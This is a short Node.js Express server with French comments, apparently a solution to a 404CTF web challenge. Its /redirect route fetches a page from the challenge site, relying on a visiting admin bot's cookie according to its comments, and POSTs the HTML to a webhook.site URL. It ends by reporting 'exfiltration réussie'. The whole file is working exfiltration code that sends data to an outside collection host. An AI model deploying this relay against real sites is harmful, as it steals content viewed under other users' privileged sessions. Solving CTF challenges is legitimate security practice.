const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

// Ton webhook.site
const WEBHOOK_URL = "https://webhook.site/714d78b3-a2b4-46a1-842f-0f5dcfda846a";

app.get('/redirect', async (req, res) => {
  const targetUrl = 'http://spacefleetcommand.404ctf.fr/spaceship/3';

  try {
    const response = await fetch(targetUrl, {
      headers: {
        // Ne change rien ici ! Le bot aura déjà le cookie admin.
      }
    });

    const html = await response.text();

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: html
    });

    res.send('✅ Bot exfiltration réussie.');
  } catch (err) {
    console.error('[!] Erreur exfiltration:', err);
    res.status(500).send('Erreur serveur.');
  }
});

app.listen(port, () => {
  console.log(`[*] Serveur en écoute sur port ${port}`);
});
